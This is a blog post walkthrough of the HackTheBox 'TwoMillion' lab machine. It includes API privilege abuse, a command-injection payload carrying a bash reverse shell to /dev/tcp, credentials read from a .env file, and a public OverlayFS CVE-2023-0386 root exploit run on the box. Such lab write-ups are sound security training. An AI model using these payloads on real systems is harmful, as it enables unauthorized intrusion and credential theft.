---
layout: post
title: HackTheBox TwoMillion
date: 2023-06-07
tags: [HackTheBox, Linux]
---

# Machine Synopsis

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell. ([Source](https://app.hackthebox.com/machines/TwoMillion/information))

# Enumeration

```bash
$ nmap -sC -sV 10.10.11.221
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.221
Host is up (0.0054s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
8888/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.6)
|_http-server-header: SimpleHTTP/0.6 Python/3.10.6
|_http-title: Directory listing for /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here is the website.

![webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/TwoMillion/webpage.png?raw=true)

Here is the login page.

![webpage_login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/TwoMillion/webpage_login.png?raw=true)

Here is the page to enter am invite code.

![webpage_join](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/TwoMillion/webpage_join.png?raw=true)

There is an interesting `inviteapi.min.js` script in the source code of this `/invite` page.

```html
<!-- scripts -->
<script src="/js/htb-frontend.min.js"></script>
<script defer src="/js/inviteapi.min.js"></script>
```

Visit `http://2million.htb/js/inviteapi.min.js` to view the js file.

```js
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
```

Observe that there is a `makeInviteCode()` function available. Lets execute that in the browser console on `/invite`.

![makeInviteCode](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/TwoMillion/makeInviteCode.png?raw=true)

```js
data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
enctype: "ROT13"
```

Decode the cipher in [rot13.com](https://rot13.com/).

```js
"In order to generate the invite code, make a POST request to /api/v1/invite/generate"
```

Make a `POST` request to `/api/v1/invite/generate` to get our invite code.

```bash
$ curl -X POST http://2million.htb/api/v1/invite/generate -s | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "V0E1WEUtTUJCTzEtNFgzQU8tQzhGTzY=",
    "format": "encoded"
  }
}
```

Base64 decode the code.

```bash
$ echo "V0E1WEUtTUJCTzEtNFgzQU8tQzhGTzY=" | base64 -d
WA5XE-MBBO1-4X3AO-C8FO6
```

Fill the the invite code in `/invite` and it will redirect us to `/register`.

![register](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/TwoMillion/register.png?raw=true)

Login to our account after registration.

![dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/TwoMillion/dashboard.png?raw=true)

The only webpage interesting was the `Lab Access`.

![dashboard_labaccess](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/TwoMillion/dashboard_labaccess.png?raw=true)

Clicking on `Connection Pack` shows the following HTTP request.

```http
GET /api/v1/user/vpn/generate HTTP/1.1
```

Clicking on `Regenerate` shows the following HTTP request.

```http
GET /api/v1/user/vpn/regenerate HTTP/1.1
```

Sent a HTTP request to `/api`.

>   `GET /api HTTP/1.1`

```http
HTTP/1.1 200 OK
Server: nginx
...
{
  "/api/v1": "Version 1 of the API"
}
```

It shows that version 1 API is available. Sent a HTTP request to `/api/v1`.

>   `GET /api/v1 HTTP/1.1`

```http
HTTP/1.1 200 OK
Server: nginx
...
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Tried sending an API `GET` request to `/api/v1/admin/auth` but it returned `false`.

Tried sending an API `POST` request to `/api/v1/admin/vpn/generate` but it returned `401 Unauthorized`. 

Tried sending an API `PUT` request to and it returned `200 OK` with an error message.

```http
HTTP/1.1 200 OK
Server: nginx
...
{
  "status": "danger",
  "message": "Invalid content type."
}
```

It appears that we need a `Content-Type` in the HTTP request.

```http
PUT /api/v1/admin/settings/update HTTP/1.1
...
Content-Type: application/json
...
```

```http
HTTP/1.1 200 OK
...
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Now we need an `email` parameter in our HTTP request.

```http
PUT /api/v1/admin/settings/update HTTP/1.1
...
Content-Type: application/json
...
{
	"email" : "shiro@2million.htb"
}
```

```http
HTTP/1.1 200 OK
...
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Now we need an `is_admin` paramter.

```http
PUT /api/v1/admin/settings/update HTTP/1.1
...
Content-Type: application/json
...
{
  "email": "shiro@2million.htb",
  "is_admin": true
}
```

```http
HTTP/1.1 200 OK
...
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

The `is_admin` parameter only accepts `0` or `1` as value.

```http
PUT /api/v1/admin/settings/update HTTP/1.1
...
Content-Type: application/json
...
{
  "email": "shiro@2million.htb",
  "is_admin": 1
}
```

```http
HTTP/1.1 200 OK
...
{
  "id": 14,
  "username": "shiro",
  "is_admin": 1
}
```

Finally we should be admin. We can verify this by sending a `GET` request to `/api/v1/admin/auth`, which the server returned `“message”:true`.

Now that we have admin, we should be able to generate a VPN by sending a `POST` request to `/api/v1/admin/vpn/generate`.

```http
HTTP/1.1 200 OK
...
{
  "status": "danger",
  "message": "Invalid content type."
}
```

It appears that we need a `Content-Type` in our HTTP request.

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
...
Content-Type: application/json
...
```

```http
HTTP/1.1 200 OK
...
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

Now we need a `username` parameter.

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
...
{
  "username": "shiro"
}
```

```http
HTTP/1.1 200 OK
...
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
...
```

We have successfully generated our VPN. However, the VPN generated didn’t look interesting.

Tried checking for simple command injection by adding a `;` to break the command, followed by a `#` to comment out anything after our command.

``` http
POST /api/v1/admin/vpn/generate HTTP/1.1
...
{
  "username": "shiro;id #"
}
```

```http
HTTP/1.1 200 OK
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It worked. Leveraged on this to get a reverse shell connection.

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
...
{
  "username": "shiro;bash -c 'bash -i >& /dev/tcp/$ip/9001 0>&1' #"
}
```

```bash
$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.11.221] 33680
bash: cannot set terminal process group (1178): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ 
```

# Exploitation

Enumerated for interesting files and found a `.env` file which contained the credentials for `admin` user.

```bash
www-data@2million:~/html$ pwd
/var/www/html
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 May 23 13:20 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 May 23 13:20 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

We could simply switch user to admin with the password found.

```bash
www-data@2million:~/html$ su admin
Password: SuperDuperPass123
whoami
admin
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

# Privilege Escalation

SSH into the machine as `admin` for a stable and interactive shell.

```bash
ssh admin@10.10.11.221
...
admin@10.10.11.221's password: SuperDuperPass123
...
You have mail.
...
admin@2million:~$ 
```

Upon logging into SSH, we were greeted with a banner that states `You have mail.`. The mail can be found at `/var/mail`.

```bash
admin@2million:~$ cd /var/mail/
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

It seems to be a message hinting us about some Linux Kernel vulnerability regarding `OverlayFS / FUSE`.

```bash
admin@2million:/var/mail$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:/var/mail$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
```

This version is vulnerable to [CVE-2023-0386](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/). Looking for exploit on GitHub brought us to this [repo](https://github.com/sxlmnwb/CVE-2023-0386).

We can download the zip file and transfer it over to the victim machine.

```bash
$ scp CVE-2023-0386.zip admin@10.10.11.221:/tmp
admin@10.10.11.221's password: 
...
100%
```

Now we SSH into the machine and find our file in the `/tmp` folder.

```bash
admin@2million:~$ cd /tmp/
admin@2million:/tmp$ unzip CVE-2023-0386.zip 
admin@2million:/tmp$ cd CVE-2023-0386
admin@2million:/tmp/CVE-2023-0386$ make all
...
```

Compile the codes with `make all` and follow the instructions as shown in the GitHub repository.

```bash
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
[1] 18926
admin@2million:/tmp/CVE-2023-0386$ [+] len of gc: 0x3ee0
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 May 23 13:54 .
drwxrwxr-x 6 root   root     4096 May 23 13:54 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@2million:/tmp/CVE-2023-0386#
```

There was a `thank_you.json` at `/root`. You can find the decoded text [here](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',false,false)XOR(%7B'option':'UTF8','string':'HackTheBox'%7D,'Standard',false)&input=eyJlbmNvZGluZyI6ICJ1cmwiLCAiZGF0YSI6ICIlN0IlMjJlbmNvZGluZyUyMjolMjAlMjJoZXglMjIsJTIwJTIyZGF0YSUyMjolMjAlMjI3YjIyNjU2ZTYzNzI3OTcwNzQ2OTZmNmUyMjNhMjAyMjc4NmY3MjIyMmMyMDIyNjU2ZTYzNzI3MDc5NzQ2OTZmNmU1ZjZiNjU3OTIyM2EyMDIyNDg2MTYzNmI1NDY4NjU0MjZmNzgyMjJjMjAyMjY1NmU2MzZmNjQ2OTZlNjcyMjNhMjAyMjYyNjE3MzY1MzYzNDIyMmMyMDIyNjQ2MTc0NjEyMjNhMjAyMjQ0NDE1MTQzNDc1ODUxNjc0MjQzNDU0NTRjNDM0MTQ1NDk1MTUxNzM1MzQzNTk3NDQxNjg1NTM5NDQ3NzZmNjY0YzU1NTI3NjUzNDQ2NzY0NjE0MTQxNTI0NDZlNTE2MzQ0NTQ0MTQ3NDY0MzUxNDU0MjMwNzM2NzQyMzA1NTZhNDE1MjU5NmU0NjQxMzA0OTRkNTU2NzQ1NTk2NzQ5NTg0YTUxNTE0ZTQ4N2E3MzY0NDY2ZDQ5NDM0NTUzNTE0NTQ1NDIzODM3NDI2NzQyNjk0MjY4NWE2ZjQ0Njg1OTVhNjQ0MTQ5NGI0ZTc4MzA1NzRjNTI2ODQ0NDg3YTczNTA0MTQ0NTk0ODQ4NTQ3MDUwNTE3YTc3Mzk0ODQxMzE2OTQyNjg1NTZjNDI0MTMwNTk0ZDU1Njc1MDRjNTI1YTU5NGI1MTM4NDg1MzdhNGQ2MTQyNDQ1OTQ3NDQ0NDMwNDY0MjZiNjQzMDQ4Nzc0MjY5NDQ0MjMwNmI0MjQxNDU1YTRlNTI3NzQxNTk2ODczNTE0YzU1NDU0MzQzNDQ3NzQyNDE0NDUxNGI0NjUzMzA1MDQ2MzA3MzM3NDQ2YjU1Nzc0MzY4NmI3MjQzNTE2ZjQ2NGQzMDY4NTg1OTY3NDk1MjRhNDEzMDRiNDI0NDcwNDk0Njc5NjM0MzQ3NTQ2ZjRiNDE2NzZiMzQ0NDU1NTUzMzQ4NDIzMDM2NDU2YjRhNGM0MTQxNDE0ZDRkNTUzODUyNGE2NzQ5NTI0NDZhNDE0MjQyNzkzNDRiNTc0MzM0NDU0MTY4MzkzMDQ4Nzc2ZjMzNDE3ODc4NmY0NDc3Nzc2NjY0NDE0MTQ1NGU0MTcwNTk0YjY3NTE0NzQyNTg1MTU5NDM2YTQ1NjM0NTUzNmY0ZTQyNmI3MzZhNDE1MjQ1NzE0MTQxMzAzODUxNTE1OTRiNGU3NzQyNDY0OTc3NDU2MzYxNDE1MTU2NDQ2OTU5NTI1MjUzMzA0MjQ4NTc2NzRmNDI1NTczNzQ0Mjc4NDI3MzVhNTg0OTRmNDU3Nzc3NDc2NDQyNzc0ZTRhMzAzODRmNGM1MjRkNjE1MzdhNTk0ZTQxNjk3MzQyNDY2OTQ1NTA0MjQ1NjQzMDQ5NDE1MTY4NDI0Mzc3Njc0MjQzNDU0NTRjNDU2NzRlNDk3ODc4NTk0YjY3NTE0NzQyNTg1MTRiNDU0MzczNDQ0NDQ3Njc1NTQ1Nzc1MTM2NTM0MjQ1NzE0MzZjNjc3MTQyNDEzODQzNGQ1MTM1NDY0ZTY3NjM1YTUwNDU0NTQ5NDI1NDczNjY0MzUzNjM0YzQ4NzkzMTQyNDU0MTRkMzE0NzY3Nzc3MzQzNDY1MjZmNDE2Nzc3NDg0ZjQxNmI0ODRjNTIzMDVhNTA0MTY3NGQ0MjU4Njg0OTQyNDM3NzRjNTc0MzQxNDE0NDUxMzg2ZTUyNTE2ZjczNTQ3ODMwNzc0NTUxNTk1YTUwNTEzMDRjNDk1MTcwNTk0YjUyNGQ0NzUzN2E0OTY0NDM3OTU5NGY0NjUzMzA1MDQ2Nzc2ZjM0NTM0MjQ1NzQ1NDc3Njc3NDQ1Nzg0MTQ1NGY2NzZiNGE1OTY3MzQ1NzRjNDU0NTU0NDc1NDczNGY0MTQ0NDU2MzQ1NTM2MzUwNDE2NzY0MzA0NDc4NjM3NDQ3NDE3NzY3NTQzMDRkMmY0Zjc3Mzg0MTRlNjc2MzY0NGY2YjMxNDQ0ODQ0NDY0OTQ0NTM0ZDVhNDg1NzY3NDg0NDQyNjc2NzQ0NTI2MzZlNDMzMTY3NzA0NDMwNGQ0ZjRmNjgzNDRkNGQ0MTQxNTc0YTUxNTE0ZTQ4MzM1MTY2NDQ1MzYzNjQ0ODU3Njc0OTQ0NTE1NTM3NDg2NzUxMzI0MjY4NjM2ZDUxNTI2MzQ0NGE2NzQ1NTQ0YTc4Nzg1OTRiNTEzODQ4NTM3OTYzNDQ0NDQzMzQ0NDQzMzI2NzQxNDU1MTM1MzA0MTQxNmY3MzQzNjg3ODZkNTE1MzU5NGI0ZTc3NDI0NjQ5NTE2MzVhNGE0MTMwNDc0MjU0NGQ0ZTUyNTM0NTQxNDY1NDY3NGU0MjY4Mzg3ODQ0NDU2YzY5NDM2ODZiNzI0MzU1NGQ0NzRlNTE3MzRlNGI3NzQ1NjQ2MTQxNDk0ZDQyNTM1NTY0NDE0NDQxNGI0ODQ3NTI0MjQxNjc1NTc3NTM0MTQxMzA0MzY3NmY3ODUxNTI0MTQxNTA1MTUxNGE1OTY3NGQ2NDRiNTI0ZDRlNDQ2YTQyNDk0NDUzNGQ2MzU3NDM3MzRmNDQ1MjM4NmQ0MTUxNjMzMzQ3NzgzMDczNTE1MjYzNDU2NDQyNzc0ZTRhMzAzODYyNGE3NzMwNTA0NDZhNjM2MzQ0NDQ1MTRiNTc0MzQ1NTA0Njc3MzQzNDQyNDE3NzZjNDM2ODU5NzI0MjQ1NGQ2NjUwNDE2YjUyNTk2NzZiNGU0YzUxMzA1MTUzNzk0MTQxNDQ0NDQ2NTA0NDY5NDU0NDQ1NTE2ZjM2NDg0NTU1Njg0MTQyNTU2YzQ2NDEzMDQzNDk0MjQ2NGM1MzQ3NTU3MzRhMzA0NTQ3NDM2YTYzNDE1MjUzNGQ0MjQ4NDc2NzQ1NDY1MTM0NmQ0NTU1NTU3NjQzNjg1NTcxNDI0MjQ2NGM0Zjc3MzU0NjRlNjc2MzY0NjE0MzZiNDM0MzQ0MzgzODQ0NTM2Mzc0NDY3YTQyNDI0MTQxNTEzNTQyNTI0MTczNDI2Nzc3Nzg1NDU1NGQ2NjUwNDE2YjRjNGI1NTM4NDI0YTc4NTI0NDQ0NTQ3MzYxNTI1MzQxNGI0NTUzNTk0NzUxNzc3MDMwNDc0MTUxNzc0NzMxNjc2ZTQyMzA0ZDY2NTA0MTQ1NTc1OTY3NTk1NzRiNzg0ZDQ3NDQ3YTMwNGI0MzUzNjQ1MDQ1Njk2MzU1NDU1MTU1Nzg0NTU1NzQ2OTRlNjg2MzM5NDUzMDRkNDk0Zjc3NTk1MjRkNDE1OTYxNTA1MjU1NGI0MjQ0NmY2MjUyNTM2ZjRmNDQ2OTMxNDI0NTQxNGQzMTQ3NDE0MTZkNTQ3Nzc3Njc0MjQ1NGQ2NDRkNTI2ZjYzNTk2NzZiNWE0YjY4NGQ0YjQzNDg1MTQ4NDEzMjQ5NDE0NDU0NzA0MjQ1Nzc2MzMxNDg0MTRkNzQ0ODUyNTY2ZjQxNDEzMDUwNjQ0MTQ1NGM0ZDUyMzg1MjRmNjc1MTQ4NTM3OTQ1NjI1MjU0NTk0MTU3NDM3MzRmNDQ1MjM4Mzk0MjY4NDE2YTQxNzg1MTc4NTE1MTZmNDY0ZjY3NjM1NDQ5Nzg3MzY0NjE0MTQxNGU0NDMzNTE0ZTQ1NzkzMDQ0NDQ2OTMxNTA1MTdhNzc3ODUzNDE1MTc3NDM2YzY3Njg0NDQxMzQ0ZjRmNjg3MzQxNGM2ODVhNTk0ZjQyNGQ0ZDQ4NmE0MjQ5NDM2OTUyNTA0NDc5NDE0MTQ2MzA3MzZhNDQ1NTU1NzE0NDY3MzQ3NDUxNTE0OTQ5NGU3NzYzNDk0ZDY3NGQ1MjRmNzc2YjQ3NDQzMzUxNjM0MzY5NTU0YjQ0NDM0MTQ1NDU1NTY0MzA0MzUxNzM2ZDU0NzczODc0NTE1MTU5NGI0ZDc3MzA1ODRjNjg1YTU5NGI1MTM4NTg0MTZhNjM0MjQ2NTM0ZDYyNDg1NzY3NTY0Mzc3MzUzMDQzNzc2ZjMzNDE1MTc3NmI0MjQyNDE1OTY0NDE1NTRkNGM2NzZmNGM1MDQxMzQ0ZTQ0Njk2NDQ5NDg0MzYzNjI1NzQ0Nzc0ZjUxNzc2NzM3NDI1MTQyNzM1YTU4NDk0MTQyNDI0NTRmNjM3ODc0NDY0ZTY3NDI1OTUwNDE2YjQ3NTM3YTZmNGU0ODU0NWE1MDQ3Nzk0MTQxNDU3ODM4Nzg0NzZiNmM2OTQ3NDI0MTc0NDU3NzVhNGM0OTc3MzE0NjRlNTE1OTU1NGE0NTQ1NDE0MjQ0NmY2MzQ0NDM3NzYxNDg1NzY3NTY0NDQ1NzM2YjQ4NTI1OTcxNTQ3Nzc3Njc0MjQ1NGQ0YTRmNzgzMDRjNGE2NzM0NGI0OTUxNTE1MTUzN2E3MzRmNTI1MzQ1NTc0NzY5MzA1NDQ1NDEzNDMzNDg1MjYzNzI0Nzc3NDY2YjUxNTE2ZjQ2NGE3ODY3NGQ0ZDQxNzA1OTUwNDE2YjQ3NTM3YTZmNGU0ODU0NWE1MDQ4NzkzMDUwNDI2ODZiMzE0ODQxNzc3NDQxNTY2NzZlNDIzMDRkNGY0OTQxNDE0ZDQ5NTEzNDU1NjE0MTZiNDM0MzQ0Mzg0ZTQ2N2E0NjQ0NTc0MzZiNTA0MjMwNzMzMzQ3Njc0MTZhNDc3ODMxNmY0MTQ1NGQ2MzRmNzg2ZjRhNGE2YjM4NTA0OTQxNTE1MjQ0NmU1MTQ0NDM3OTMwNTk0NjQzMzA0NjQyNDEzNTMwNDE1MjVhNjk0NDY4NzM3MjQyNDI0MTU5NTA1MTZmNGE0YTMwMzg0ZDRhMzA0NTQzNDI3YTY4NDc2MjMwNjczNDQ1NTQ3NzRhNTE3NzM4Nzg0NDUyNTU2ZTQ4NDE3ODZmNDI2ODQ1NGI0OTQxNDU1MjRlNzc3MzY0NWE0Nzc0NzA1MDdhNzc0ZTUyNTE2ZjRmNDc3OTRkMzE0Mzc3MzQ1NzQyNzgzMTY5NGY3ODMwNzA0NDQxM2QzZDIyN2QlMjIlN0QifQ).





